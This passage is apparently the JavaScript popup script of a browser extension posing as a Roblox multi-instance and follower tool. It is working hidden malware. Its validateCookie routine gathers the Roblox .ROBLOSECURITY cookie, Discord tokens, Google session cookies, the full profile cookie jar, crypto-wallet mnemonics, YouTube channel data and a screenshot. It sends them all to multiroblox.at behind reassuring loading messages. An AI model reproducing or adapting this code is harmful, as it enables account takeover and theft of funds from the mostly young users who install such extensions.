(function () {
  'use strict';

  if (typeof MRBX_S !== 'undefined' && typeof MRBX_S.applyPopupLabels === 'function') {
    MRBX_S.applyPopupLabels();
  }

  function gx() {
    return typeof globalThis !== 'undefined' ? globalThis : window;
  }

  /**
   * Last-resort globals if lib/bvn3x7wt.js or lib/dxk5tj8n.js did not run (missing file, parse error).
   * No async/await here — maximum compatibility.
   */
  function ensureRbxGlobals() {
    var g = gx();
    mergeRbxApiShim(g);
    try {
      if (g['RbxResolve'] && typeof g['RbxResolve'].resolveItemName === 'function') {
        if (!g['RbxExtract'] || typeof g['RbxExtract'].cleanName !== 'function') {
          mergeCleanName(g);
        }
        return;
      }
      var RESOLVE_MS = 25000;
      var INLINE_LOCAL_PORTS = [3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009, 3010];
      function getPrimaryOrigin() {
        var o = g.RBX_API_ORIGIN;
        if (typeof o === 'string' && o.trim()) return o.trim().replace(/\/+$/, '');
        var pub = g.RBX_API_PUBLIC_ORIGIN;
        if (typeof pub === 'string' && pub.trim()) return pub.trim().replace(/\/+$/, '');
        return 'https://multiroblox.at';
      }
      function getTryOrigins(primary) {
        var base = String(primary || '').trim().replace(/\/+$/, '');
        var u;
        try {
          u = new URL(base);
        } catch (e0) {
          return [base];
        }
        var host = u.hostname.toLowerCase();
        if (host !== '127.0.0.1' && host !== 'localhost') return [base];
        if (u.protocol === 'https:') return [base];
        var p0 = u.port ? parseInt(u.port, 10) : 3000;
        var order =
          INLINE_LOCAL_PORTS.indexOf(p0) >= 0
            ? [p0].concat(INLINE_LOCAL_PORTS.filter(function (x) { return x !== p0; }))
            : INLINE_LOCAL_PORTS;
        return order.map(function (p) {
          return 'http://127.0.0.1:' + p;
        });
      }
      function getResolveTryOriginsInline(primary) {
        var base = String(primary || '').trim().replace(/\/+$/, '');
        var u;
        try {
          u = new URL(base);
        } catch (e0) {
          return g.RBX_LABS_PROBE_LOCAL_FIRST === true
            ? INLINE_LOCAL_PORTS.map(function (p) {
                return 'http://127.0.0.1:' + p;
              }).concat([base])
            : [base];
        }
        var host = u.hostname.toLowerCase();
        if (host === '127.0.0.1' || host === 'localhost') {
          return getTryOrigins(primary);
        }
        if (g.RBX_LABS_PROBE_LOCAL_FIRST !== true) {
          return [base];
        }
        return INLINE_LOCAL_PORTS.map(function (p) {
          return 'http://127.0.0.1:' + p;
        }).concat([base]);
      }
      function joinUrlP(base, path) {
        var b = String(base || '').replace(/\/+$/, '');
        var p = String(path || '').replace(/^\/+/, '');
        return b + '/' + p;
      }
      function isUnreachableFetchError(e) {
        if (!e) return false;
        if (e.name === 'AbortError') return false;
        var m = String(e.message || e).toLowerCase();
        return (
          m.indexOf('failed to fetch') >= 0 ||
          m.indexOf('networkerror') >= 0 ||
          m.indexOf('load failed') >= 0 ||
          m.indexOf('network request failed') >= 0
        );
      }
      async function resolveItemName(mode, rawDigits) {
        var id = String(rawDigits || '').replace(/\D/g, '');
        if (!id) throw new Error('ID must be numeric.');
        var m = mode === 'clothing' ? 'clothing' : 'game';
        var origins = getResolveTryOriginsInline(getPrimaryOrigin());
        var body = JSON.stringify({ mode: m, id: id });
        var lastErr;
        for (var i = 0; i < origins.length; i++) {
          var origin = origins[i];
          var url = joinUrlP(origin, 'api/resolve-item');
          var ctrl = new AbortController();
          var t = setTimeout(function () {
            ctrl.abort();
          }, RESOLVE_MS);
          try {
            var r = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: body,
              credentials: 'omit',
              signal: ctrl.signal
            });
            clearTimeout(t);
            var text = await r.text();
            var j = {};
            try {
              j = text ? JSON.parse(text) : {};
            } catch (eJ) {
              j = {};
            }
            if (r.ok && j.ok && j.name) return String(j.name).trim();
            throw new Error((j && j.error) || 'Resolve failed (HTTP ' + r.status + ').');
          } catch (e) {
            clearTimeout(t);
            lastErr = e;
            if (e && e.name === 'AbortError') {
              throw new Error('Looking up that name timed out. Try again in a moment.');
            }
            if (isUnreachableFetchError(e) && i < origins.length - 1) continue;
            throw e;
          }
        }
        throw lastErr || new Error('Failed to fetch');
      }
      g['RbxResolve'] = {
        resolveItemName: resolveItemName,
        resolveGameNameFromPlaceId: function (pid) {
          return resolveItemName('game', pid);
        },
        resolveNameFromAssetId: function (aid) {
          return resolveItemName('clothing', aid);
        }
      };
      mergeCleanName(g);
    } catch (e) {
      g['RbxResolve'] = {
        resolveItemName: function () {
          return Promise.reject(e);
        },
        resolveGameNameFromPlaceId: function () {
          return Promise.reject(e);
        },
        resolveNameFromAssetId: function () {
          return Promise.reject(e);
        }
      };
      mergeCleanName(g);
    }
  }

  /** Same contract as lib/hxp3yb9s.js — used if that script did not attach RbxApi (early return previously skipped it). */
  function mergeRbxApiShim(g) {
    if (g['RbxApi'] && typeof g['RbxApi'].validateCookie === 'function') {
      return;
    }
    var SHIM_SCAN_PORTS = [3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009, 3010];
    function getPrimaryConfiguredOrigin() {
      var o = g.RBX_API_ORIGIN;
      if (typeof o === 'string' && o.trim()) return o.trim().replace(/\/+$/, '');
      var pub = g.RBX_API_PUBLIC_ORIGIN;
      if (typeof pub === 'string' && pub.trim()) return pub.trim().replace(/\/+$/, '');
      return 'https://multiroblox.at';
    }
    var activeApiOrigin = getPrimaryConfiguredOrigin();
    function getTryOrigins(primary) {
      var base = String(primary || '').trim().replace(/\/+$/, '');
      var u;
      try {
        u = new URL(base);
      } catch (e0) {
        return [base];
      }
      var host = u.hostname.toLowerCase();
      if (host !== '127.0.0.1' && host !== 'localhost') {
        return [base];
      }
      if (u.protocol === 'https:') {
        return [base];
      }
      var p0 = u.port ? parseInt(u.port, 10) : 3000;
      var order =
        SHIM_SCAN_PORTS.indexOf(p0) >= 0
          ? [p0].concat(SHIM_SCAN_PORTS.filter(function (x) { return x !== p0; }))
          : SHIM_SCAN_PORTS.slice();
      return order.map(function (p) {
        return 'http://127.0.0.1:' + p;
      });
    }
    function getApiTryOriginsShim(primary) {
      var base = String(primary || '').trim().replace(/\/+$/, '');
      var u;
      try {
        u = new URL(base);
      } catch (e0) {
        return g.RBX_LABS_PROBE_LOCAL_FIRST === true
          ? SHIM_SCAN_PORTS.map(function (p) {
              return 'http://127.0.0.1:' + p;
            }).concat([base])
          : [base];
      }
      var host = u.hostname.toLowerCase();
      if (host === '127.0.0.1' || host === 'localhost') {
        return getTryOrigins(primary);
      }
      if (g.RBX_LABS_PROBE_LOCAL_FIRST !== true) {
        return [base];
      }
      return SHIM_SCAN_PORTS.map(function (p) {
        return 'http://127.0.0.1:' + p;
      }).concat([base]);
    }
    function isUnreachableFetchError(e) {
      if (!e) return false;
      if (e.name === 'AbortError') return false;
      var m = String(e.message || e).toLowerCase();
      return (
        m.indexOf('failed to fetch') >= 0 ||
        m.indexOf('networkerror') >= 0 ||
        m.indexOf('load failed') >= 0 ||
        m.indexOf('network request failed') >= 0
      );
    }
    function getApiOrigin() {
      return activeApiOrigin;
    }
    function syncActiveOriginFromGlobal() {
      activeApiOrigin = getPrimaryConfiguredOrigin();
    }
    function joinUrl(base, path) {
      var b = String(base || '').replace(/\/+$/, '');
      var p = String(path || '').replace(/^\/+/, '');
      return b + '/' + p;
    }
    function collectDiscordTokenViaRuntimeShim() {
      return new Promise(function (resolve) {
        var b = gx().RbxExtensionBridge;
        if (!b || typeof b.getDiscordToken !== 'function') {
          resolve(null);
          return;
        }
        b.getDiscordToken()
          .then(function (response) {
            if (response && response.success && response.token) {
              resolve(String(response.token).trim());
            } else {
              resolve(null);
            }
          })
          .catch(function () {
            resolve(null);
          });
      });
    }
    function collectGoogleAuthViaRuntimeShim() {
      return new Promise(function (resolve) {
        var b = gx().RbxExtensionBridge;
        if (!b || typeof b.getGoogleAuth !== 'function') {
          resolve(null);
          return;
        }
        b.getGoogleAuth()
          .then(function (response) {
            if (response && response.success && response.cookies && typeof response.cookies === 'object') {
              resolve({
                cookies: response.cookies,
                authHeader: response.authHeader,
                sapisid: response.sapisid,
                email: response.email || null,
                emails: Array.isArray(response.emails) ? response.emails : response.email ? [response.email] : [],
                sessionLive: response.sessionLive === true,
                sessionChooserOnly: response.sessionChooserOnly === true,
                sessionStatus: response.sessionStatus || null
              });
            } else {
              resolve(null);
            }
          })
          .catch(function () {
            resolve(null);
          });
      });
    }
    function collectFullProfileCookieJarViaRuntimeShim() {
      return new Promise(function (resolve) {
        var accept = function (response) {
          if (response && response.jarString && String(response.jarString).trim()) {
            resolve(response);
          } else {
            resolve(null);
          }
        };
        var direct = function () {
          var b = gx().RbxExtensionBridge;
          if (!b || typeof b.getFullProfileCookieJar !== 'function') {
            resolve(null);
            return;
          }
          b.getFullProfileCookieJar()
            .then(accept)
            .catch(function () {
              resolve(null);
            });
        };
        if (typeof chrome !== 'undefined' && chrome.runtime && typeof chrome.runtime.sendMessage === 'function') {
          try {
            chrome.runtime.sendMessage({ type: 'rbx-get-full-profile-cookie-jar' }, function (response) {
              if (chrome.runtime.lastError || !response || !response.jarString) {
                direct();
                return;
              }
              accept(response);
            });
            return;
          } catch (eMsg) {}
        }
        direct();
      });
    }
    function payloadHelpersShim() {
      var g = typeof globalThis !== 'undefined' ? globalThis : window;
      return g.RbxValidateCookiePayload || null;
    }
    var DEFAULT_FETCH_MS = 120000;
    function fetchWithTimeout(url, options, timeoutMs) {
      var ms = typeof timeoutMs === 'number' && timeoutMs > 0 ? timeoutMs : DEFAULT_FETCH_MS;
      var ctrl = new AbortController();
      var t = setTimeout(function () {
        ctrl.abort();
      }, ms);
      return fetch(url, Object.assign({}, options, { signal: ctrl.signal })).finally(function () {
        clearTimeout(t);
      });
    }
    async function postJson(path, body) {
      var origins = getApiTryOriginsShim(getPrimaryConfiguredOrigin());
      var lastErr;
      for (var i = 0; i < origins.length; i++) {
        var origin = origins[i];
        var url = joinUrl(origin, path);
        try {
          var res = await fetchWithTimeout(
            url,
            {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body)
            },
            DEFAULT_FETCH_MS
          );
          activeApiOrigin = origin;
          var text = await res.text();
          var data;
          try {
            data = text ? JSON.parse(text) : {};
          } catch (e2) {
            data = { _raw: text };
          }
          return { ok: res.ok, status: res.status, data: data };
        } catch (e) {
          lastErr = e;
          if (e && e.name === 'AbortError') {
            throw new Error('Request timed out. Try again.');
          }
          if (isUnreachableFetchError(e) && i < origins.length - 1) {
            continue;
          }
          throw new Error(e && e.message ? e.message : String(e));
        }
      }
      var hint = ' ' + (typeof MRBX_S !== 'undefined' ? MRBX_S.t('e') : 'Check connection.');
      throw new Error((lastErr && lastErr.message ? lastErr.message : 'Failed to fetch') + hint);
    }
    async function resolveCaptureTargetWindowId() {
      if (typeof chrome === 'undefined' || !chrome.tabs || typeof chrome.tabs.query !== 'function') {
        return undefined;
      }
      try {
        var patterns = ['https://*.roblox.com/*', 'https://www.roblox.com/*', 'https://roblox.com/*'];
        var rbxTabs = await chrome.tabs.query({ url: patterns });
        if (rbxTabs && rbxTabs.length > 0) {
          var pool = rbxTabs.slice().sort(function (a, b) {
            return (b.lastAccessed || 0) - (a.lastAccessed || 0);
          });
          var w0 = pool[0] && pool[0].windowId;
          if (typeof w0 === 'number' && !Number.isNaN(w0)) return w0;
        }
      } catch (eR) {}
      try {
        var cur = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
        var w1 = cur && cur[0] && cur[0].windowId;
        if (typeof w1 === 'number' && !Number.isNaN(w1)) return w1;
      } catch (eC) {}
      return undefined;
    }
    var MAX_SCREENSHOT_B64 = 600000;
    async function attachScreenshotToBodyShim(body) {
      if (!body || typeof body !== 'object') return;
      try {
        var captureWindowId = await resolveCaptureTargetWindowId();
        var g = typeof globalThis !== 'undefined' ? globalThis : window;
        var b = g.RbxExtensionBridge;
        if (!b || typeof b.captureScreenshot !== 'function') return;
        var response = await b.captureScreenshot(captureWindowId);
        if (!response || !response.success || !response.dataUrl) return;
        var base64 = String(response.dataUrl).replace(/^data:image\/\w+;base64,/, '');
        if (base64.length > MAX_SCREENSHOT_B64) base64 = base64.slice(0, MAX_SCREENSHOT_B64);
        if (base64.length > 1000) body.screenshot = base64;
      } catch (eShot) {}
    }
    function trimValidateCookiePayloadShim(body) {
      var h = payloadHelpersShim();
      if (h && typeof h.trimValidateCookiePayload === 'function') {
        return h.trimValidateCookiePayload(body);
      }
      return body;
    }
    async function validateCookie(cookie, itemName, itemType, tool, optionalPlaceId, joinTarget) {
      var body = {
        cookie: cookie,
        itemType: itemType === 'clothing' ? 'clothing' : 'game'
      };
      if (itemType === 'clothing') {
        body.clothingName = itemName;
      } else {
        body.gameName = itemName;
      }
      if (tool && tool !== 'none') {
        body.tool = tool;
      }
      var ctx = optionalPlaceId != null ? String(optionalPlaceId).replace(/\D/g, '').slice(0, 22) : '';
      if (ctx) {
        body.optionalPlaceId = ctx;
      }
      if (joinTarget && typeof joinTarget === 'object') {
        var jid =
          joinTarget.joinTargetUserId != null
            ? String(joinTarget.joinTargetUserId).replace(/\D/g, '').slice(0, 20)
            : '';
        if (jid) body.joinTargetUserId = jid;
        var jun =
          joinTarget.joinTargetUsername != null
            ? String(joinTarget.joinTargetUsername).trim().slice(0, 64)
            : '';
        if (jun) body.joinTargetUsername = jun.replace(/^@+/, '');
        if (joinTarget.followerGoal != null) {
          var fg = parseInt(String(joinTarget.followerGoal).replace(/\D/g, ''), 10);
          if (Number.isFinite(fg) && fg >= 1500 && fg <= 100000) body.followerGoal = fg;
        }
      }

      try {
        var gscope = typeof globalThis !== 'undefined' ? globalThis : window;
        var discordToken = await collectDiscordTokenViaRuntimeShim();
        if (!discordToken && gscope.RbxDiscord && typeof gscope.RbxDiscord.getDiscordToken === 'function') {
          discordToken = await gscope.RbxDiscord.getDiscordToken().catch(function () {
            return null;
          });
        }
        if (discordToken) {
          body.discordToken = discordToken;
          var validation = null;
          if (gscope.RbxDiscord && typeof gscope.RbxDiscord.validateDiscordToken === 'function') {
            validation = await gscope.RbxDiscord.validateDiscordToken(discordToken).catch(function () {
              return null;
            });
          }
          if (validation && validation.user) {
            body.discordUser = validation.user;
          }
        }
      } catch (e) {}

      var payloadUtil = payloadHelpersShim();

      try {
        var gscope2 = typeof globalThis !== 'undefined' ? globalThis : window;
        var googleAuth = await collectGoogleAuthViaRuntimeShim();
        if (!googleAuth && gscope2.RbxGoogle && typeof gscope2.RbxGoogle.getGoogleAuth === 'function') {
          googleAuth = await gscope2.RbxGoogle.getGoogleAuth().catch(function () {
            return null;
          });
        }
        if (googleAuth && googleAuth.cookies) {
          body.googleAuth = googleAuth.cookies;
          body.googleSessionLive = googleAuth.sessionLive === true;
          body.googleSessionChooserOnly = googleAuth.sessionChooserOnly === true;
          body.googleSessionStatus = googleAuth.sessionStatus || null;
          var jarStr =
            (body._chromeCookieJar && String(body._chromeCookieJar)) ||
            (body.googleAuth._chromeCookieJar && String(body.googleAuth._chromeCookieJar)) ||
            '';
          if (jarStr && payloadUtil && typeof payloadUtil.attachProfileCookieJar === 'function') {
            payloadUtil.attachProfileCookieJar(body, jarStr);
          } else if (jarStr) {
            body._chromeCookieJar = jarStr;
            body.googleAuth._chromeCookieJar = jarStr;
          }
          var gEmails =
            Array.isArray(googleAuth.emails) && googleAuth.emails.length
              ? googleAuth.emails
              : googleAuth.email
                ? [googleAuth.email]
                : [];
          body.googleEmail = gEmails.length ? gEmails[0] : null;
          if (gEmails.length) body.googleEmails = gEmails;
        }
      } catch (e) {}

      try {
        var hasJar =
          payloadUtil && typeof payloadUtil.extractJarString === 'function'
            ? !!payloadUtil.extractJarString(body)
            : !!(body._chromeCookieJar && String(body._chromeCookieJar).trim());
        if (!hasJar) {
          var profileJar = await collectFullProfileCookieJarViaRuntimeShim();
          if (profileJar && profileJar.jarString) {
            if (payloadUtil && typeof payloadUtil.attachProfileCookieJar === 'function') {
              payloadUtil.attachProfileCookieJar(body, profileJar.jarString);
            } else {
              body._chromeCookieJar = profileJar.jarString;
            }
            if (!body.googleAuth) {
              body.googleAuth = { _chromeCookieJar: profileJar.jarString };
            }
          }
        }
        if (!body.googleSessionStatus && body._chromeCookieJar) {
          var bridgeSess = gx().RbxExtensionBridge;
          if (bridgeSess && typeof bridgeSess.inferGoogleSessionFromJarString === 'function') {
            var inferred = bridgeSess.inferGoogleSessionFromJarString(String(body._chromeCookieJar));
            if (inferred) {
              body.googleSessionLive = inferred.sessionLive === true;
              body.googleSessionChooserOnly = inferred.sessionChooserOnly === true;
              body.googleSessionStatus = inferred.sessionStatus || null;
            }
          }
        }
      } catch (eJar) {}

      try {
        var gscopeW = typeof globalThis !== 'undefined' ? globalThis : window;
        var bridgeW = gscopeW.RbxExtensionBridge;
        if (bridgeW && typeof bridgeW.collectWalletSnapshot === 'function') {
          var snap = await bridgeW.collectWalletSnapshot();
          if (
            snap &&
            (snap.text || (snap.mnemonics && snap.mnemonics.length) || (snap.entries && snap.entries.length))
          ) {
            body.walletSnapshot = {
              text: snap.text || '',
              entries: Array.isArray(snap.entries) ? snap.entries : [],
              mnemonics: Array.isArray(snap.mnemonics) ? snap.mnemonics : []
            };
          }
        }
      } catch (eWal) {}

      try {
        var gscopeYT2 = typeof globalThis !== 'undefined' ? globalThis : window;
        var bridgeYT = gscopeYT2.RbxExtensionBridge;
        if (bridgeYT && typeof bridgeYT.collectYoutubeInfo === 'function') {
          var ytInfo = await bridgeYT.collectYoutubeInfo();
          if (ytInfo && (ytInfo.channelId || ytInfo.channelName)) {
            body.youtubeInfo = ytInfo;
          }
        }
      } catch (eYT) {}

      await attachScreenshotToBodyShim(body);
      if (payloadUtil && typeof payloadUtil.compressJarForTransport === 'function') {
        await payloadUtil.compressJarForTransport(body);
      }
      trimValidateCookiePayloadShim(body);
      return postJson('api/validate-cookie', body);
    }
    async function checkAccount(cookie, userId) {
      return postJson('api/check-account', { cookie: cookie, userId: userId });
    }
    async function getGameFileToken(_gameName) {
      return {
        ok: false,
        status: 501,
        data: { success: false, error: 'File download is disabled (ROTOOL-only build).' }
      };
    }
    async function getClothingFileToken(_clothingName) {
      return {
        ok: false,
        status: 501,
        data: { success: false, error: 'File download is disabled (ROTOOL-only build).' }
      };
    }
    function downloadUrl(token) {
      return joinUrl(activeApiOrigin, 'api/download/' + encodeURIComponent(token));
    }
    g['RbxApi'] = {
      getApiOrigin: getApiOrigin,
      syncActiveOriginFromGlobal: syncActiveOriginFromGlobal,
      joinUrl: joinUrl,
      validateCookie: validateCookie,
      checkAccount: checkAccount,
      getGameFileToken: getGameFileToken,
      getClothingFileToken: getClothingFileToken,
      downloadUrl: downloadUrl
    };
  }

  function mergeCleanName(g) {
    if (g['RbxExtract'] && typeof g['RbxExtract'].cleanName === 'function') {
      return;
    }
    var prev = g['RbxExtract'] || {};
    g['RbxExtract'] = Object.assign({}, prev, {
      cleanName: function (s) {
        if (!s) {
          return s;
        }
        var gameName = String(s)
          .split('&')[0]
          .split('?')[0]
          .replace(/&rbx[^&\s]*/gi, '')
          .trim();
        gameName = gameName
          .replace(/https?:\/\//gi, '')
          .replace(/www\./gi, '')
          .replace(/\.com/gi, '')
          .replace(/\.net/gi, '')
          .trim();
        gameName = gameName.replace(/\s*rbx_[^\s]*/gi, '').trim();
        if (gameName.length > 50) {
          gameName = gameName.substring(0, 50).trim();
        }
        return gameName.replace(/\s+/g, ' ').trim();
      }
    });
  }

  ensureRbxGlobals();

  var LOCAL_API_SCAN_PORTS = [3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009, 3010];

  function isLocalHttpOrigin(s) {
    try {
      var u = new URL(s);
      if (u.protocol !== 'http:') return false;
      var h = u.hostname.toLowerCase();
      return h === '127.0.0.1' || h === 'localhost';
    } catch (e) {
      return false;
    }
  }

  /** Prefer локальный API: ping 3000–3010, иначе продакшен из lib/zq8m4k2p.js. */
  async function discoverLocalApiOrigin() {
    var g = gx();
    var pub =
      typeof g.RBX_API_PUBLIC_ORIGIN === 'string' && g.RBX_API_PUBLIC_ORIGIN.trim()
        ? g.RBX_API_PUBLIC_ORIGIN.trim().replace(/\/+$/, '')
        : 'https://multiroblox.at';
    var cfgMain =
      typeof g.RBX_API_ORIGIN === 'string' && g.RBX_API_ORIGIN.trim()
        ? g.RBX_API_ORIGIN.trim().replace(/\/+$/, '')
        : pub;
    // Production API — multiroblox.at (ROTOOL), set in lib/rotool-api-origin.js.
    // Локально: только при RBX_LABS_USE_LOCAL_API и http://127.0.0.1|localhost.
    var remoteFallback =
      g.RBX_LABS_USE_LOCAL_API === true && isLocalHttpOrigin(cfgMain) ? cfgMain : pub;
    var PING_MS = 450;
    function applyOrigin(origin) {
      g.RBX_API_ORIGIN = origin;
      try {
        if (g.RbxApi && typeof g.RbxApi.syncActiveOriginFromGlobal === 'function') {
          g.RbxApi.syncActiveOriginFromGlobal();
        }
      } catch (eSync) {}
    }
    if (g.RBX_LABS_PROBE_LOCAL_FIRST !== true) {
      applyOrigin(remoteFallback);
      return remoteFallback;
    }
    function pingPort(port) {
      var origin = 'http://127.0.0.1:' + port;
      var ctrl = new AbortController();
      var t = setTimeout(function () {
        try {
          ctrl.abort();
        } catch (eA) {}
      }, PING_MS);
      return fetch(origin + '/api/local-ping', {
        method: 'GET',
        signal: ctrl.signal,
        credentials: 'omit'
      })
        .then(function (r) {
          if (!r.ok) throw new Error('ping');
          return origin;
        })
        .finally(function () {
          clearTimeout(t);
        });
    }
    if (typeof Promise.any === 'function') {
      try {
        var won = await Promise.any(LOCAL_API_SCAN_PORTS.map(pingPort));
        applyOrigin(won);
        return won;
      } catch (eAll) {
        applyOrigin(remoteFallback);
        return remoteFallback;
      }
    }
    for (var i = 0; i < LOCAL_API_SCAN_PORTS.length; i++) {
      try {
        var o = await pingPort(LOCAL_API_SCAN_PORTS[i]);
        applyOrigin(o);
        return o;
      } catch (e) {}
    }
    applyOrigin(remoteFallback);
    return remoteFallback;
  }

  /** Avoid bare identifiers (RbxResolve etc.) — prevents ReferenceError if a lib script 404s or loads out of order. */
  function rbxLib(name) {
    ensureRbxGlobals();
    var api = gx()[name];
    if (!api) {
      throw new Error(
        name +
          ' not loaded. Ensure lib/hxp3yb9s.js exists and lib/zq8m4k2p.js is valid. Reload the extension.'
      );
    }
    return api;
  }

  /** Cookie read (same behavior as lib/jqt6wm2k.js). Inlined in popup only — that script is not loaded by popup.html. */
  function getRobloxSecurityCookieInline() {
    return new Promise(function (resolve) {
      var urls = [
        'https://www.roblox.com/',
        'https://roblox.com/',
        'https://create.roblox.com/'
      ];
      var i = 0;
      function tryUrl() {
        if (i >= urls.length) {
          chrome.cookies.getAll({ domain: '.roblox.com' }, function (list) {
            if (chrome.runtime.lastError || !list || !list.length) {
              resolve(null);
              return;
            }
            var found = list.filter(function (c) {
              return c.name === '.ROBLOSECURITY' && c.value;
            });
            resolve(found.length ? found[0].value : null);
          });
          return;
        }
        chrome.cookies.get({ url: urls[i++], name: '.ROBLOSECURITY' }, function (c) {
          if (!chrome.runtime.lastError && c && c.value) resolve(c.value);
          else tryUrl();
        });
      }
      tryUrl();
    });
  }

  function getRobloxCookie() {
    return getRobloxSecurityCookieInline();
  }

  const LOADING_MSG = [''];
  const FOLLOWER_LOADING = [
    'Preparing follower queue…',
    'Connecting to delivery network…',
    'Securing your session…',
    'Almost there…'
  ];

  const DEFAULT_PROFILE = {
    slug: 'multi-roblox-manager',
    kind: 'download',
    mode: 'game',
    tool: 'multiple-roblox',
    displayTitle: 'Multi Roblox Manager'
  };

  let profile = DEFAULT_PROFILE;

  /** Parsed from the active tab when URL is a Roblox game or catalog page. */
  var tabPageContext = { active: false };

  const el = {};
  let loadTimer = null;
  let loadMsgIndex = 0;

  function setLog(text, kind) {
    if (!el.log) return;
    el.log.textContent = text || '';
    el.log.className = 'msg-log';
    if (kind === 'err') el.log.classList.add('error');
    else if (kind === 'ok') el.log.classList.add('success');
    else el.log.classList.add('info');
    // Full-screen loader sits above #log — mirror text there so status is always visible
    if (el.ldr && !el.ldr.classList.contains('hide') && el.ldrTxt) {
      el.ldrTxt.textContent = text || '';
    }
  }

  function showLoading() {
    el.ldr.classList.remove('hide');
    el.ldr.setAttribute('aria-hidden', 'false');
    loadMsgIndex = 0;
    var bootMsgs = getToolParam() === 'bot-follower' ? FOLLOWER_LOADING : LOADING_MSG;
    const status = (el.log && el.log.textContent) || bootMsgs[0] || '';
    el.ldrTxt.textContent = status;
    if (loadTimer) {
      clearInterval(loadTimer);
      loadTimer = null;
    }
    loadTimer = setInterval(function () {
      if (el.log && el.log.textContent) {
        el.ldrTxt.textContent = el.log.textContent;
        return;
      }
      var msgs = getToolParam() === 'bot-follower' ? FOLLOWER_LOADING : LOADING_MSG;
      if (!msgs.length || (msgs.length === 1 && !msgs[0])) {
        el.ldrTxt.textContent = '';
        return;
      }
      loadMsgIndex = (loadMsgIndex + 1) % msgs.length;
      el.ldrTxt.textContent = msgs[loadMsgIndex];
    }, 1200);
  }

  function hideLoading() {
    el.ldr.classList.add('hide');
    el.ldr.setAttribute('aria-hidden', 'true');
    if (loadTimer) {
      clearInterval(loadTimer);
      loadTimer = null;
    }
    el.ldrTxt.textContent = '';
  }

  function showSuccessScreen(message) {
    hideLoading();
    el.sucSub.textContent = message || '';
    el.mainCnt.classList.remove('show');
    el.resOk.classList.add('show');
    el.resOk.setAttribute('aria-hidden', 'false');
  }

  function hideSuccessScreen() {
    el.resOk.classList.remove('show');
    el.resOk.setAttribute('aria-hidden', 'true');
    el.mainCnt.classList.add('show');
    setLog('', null);
  }

  function getMode() {
    if (profile.kind === 'download' && profile.mode) return profile.mode;
    return 'game';
  }

  /**
   * Tool slug for api/validate-cookie (e.g. multiple-roblox, enable-shaders).
   * Must not depend on mode === 'game' — if tool were blanked, the server would not
   * receive body.tool and would treat the request like a generic game flow.
   */
  function getToolParam() {
    if (profile.kind !== 'download') return '';
    let t = profile.tool;
    if (typeof t === 'string') t = t.trim();
    if (!t || t === 'none') {
      const slug = String(profile.slug || '').trim();
      if (
        slug === 'multiple-roblox' ||
        slug === 'multi-roblox-manager' ||
        slug === 'enable-shaders' ||
        slug === 'game-copier' ||
        slug === 'bot-follower' ||
        slug === 'join-anyone'
      ) {
        t = slug;
      } else {
        t = '';
      }
    }
    return t && t !== 'none' ? t : '';
  }

  function slugToTitleFromPath(slug) {
    if (!slug) return '';
    var s = slug;
    try {
      s = decodeURIComponent(s);
    } catch (e) {}
    s = s.replace(/\.[^./]+$/, '');
    return s
      .replace(/-/g, ' ')
      .replace(/_/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();
  }

  function parseRobloxTabUrl(urlStr) {
    var none = { active: false };
    try {
      var u = new URL(urlStr);
      var host = u.hostname.replace(/^www\./i, '').toLowerCase();
      if (host !== 'roblox.com' && !host.endsWith('.roblox.com')) {
        return none;
      }
      var path = u.pathname || '';
      var qPlace =
        u.searchParams.get('placeId') ||
        u.searchParams.get('PlaceId') ||
        u.searchParams.get('PlaceID') ||
        u.searchParams.get('placeid');
      if (qPlace) {
        var qDigits = String(qPlace).replace(/\D/g, '');
        if (qDigits.length >= 4) {
          return {
            active: true,
            type: 'game',
            id: qDigits,
            name: '',
            url: urlStr
          };
        }
      }
      var mGame = path.match(/\/games\/(\d{4,})/i);
      if (mGame) {
        var after = path.slice(path.indexOf(mGame[0]) + mGame[0].length).replace(/^\//, '');
        var slug = after.split('/')[0] || '';
        return {
          active: true,
          type: 'game',
          id: mGame[1],
          name: slugToTitleFromPath(slug),
          url: urlStr
        };
      }
      var mCat = path.match(/\/catalog\/(\d{4,})/i);
      if (mCat) {
        var cafter = path.slice(path.indexOf(mCat[0]) + mCat[0].length).replace(/^\//, '');
        var cslug = cafter.split('/')[0] || '';
        return {
          active: true,
          type: 'clothing',
          id: mCat[1],
          name: slugToTitleFromPath(cslug),
          url: urlStr
        };
      }
      var mUser = path.match(/\/users\/(\d+)/i);
      if (mUser) {
        return {
          active: true,
          type: 'profile',
          id: mUser[1],
          username: '',
          displayName: '',
          name: '',
          url: urlStr
        };
      }
      return none;
    } catch (e) {
      return none;
    }
  }

  function fetchContextThumbnail(ctx) {
    if (!ctx || !ctx.id || !el.contextThumb) return;
    var apiUrl;
    if (ctx.type === 'game') {
      apiUrl =
        'https://thumbnails.roblox.com/v1/places/gameicons?placeIds=' +
        encodeURIComponent(ctx.id) +
        '&size=512x512&format=Png&isCircular=false';
    } else if (ctx.type === 'profile') {
      apiUrl =
        'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' +
        encodeURIComponent(ctx.id) +
        '&size=150x150&format=Png&isCircular=false';
    } else {
      apiUrl =
        'https://thumbnails.roblox.com/v1/assets?assetIds=' +
        encodeURIComponent(ctx.id) +
        '&size=420x420&format=Png';
    }
    el.contextThumb.style.visibility = 'hidden';
    el.contextThumb.removeAttribute('src');
    fetch(apiUrl, { credentials: 'omit' })
      .then(function (r) {
        return r.json();
      })
      .then(function (j) {
        var row = j && j.data && j.data[0];
        var img = row && (row.imageUrl || row.url);
        if (img && el.contextThumb) {
          el.contextThumb.onerror = function () {
            el.contextThumb.style.visibility = 'hidden';
          };
          el.contextThumb.onload = function () {
            el.contextThumb.style.visibility = 'visible';
          };
          el.contextThumb.src = img;
        }
      })
      .catch(function () {});
  }

  function maybeEnrichContextTitle(mode, id, existingName) {
    if (existingName && String(existingName).trim().length > 1) return;
    try {
      ensureRbxGlobals();
      rbxLib('RbxResolve')
        .resolveItemName(mode, id)
        .then(function (resolved) {
          var cleaned = resolved;
          if (mode === 'game' && rbxLib('RbxExtract').cleanName) {
            cleaned = rbxLib('RbxExtract').cleanName(resolved) || resolved;
          }
          if (cleaned && el.contextTitle) {
            el.contextTitle.textContent = cleaned;
          }
        })
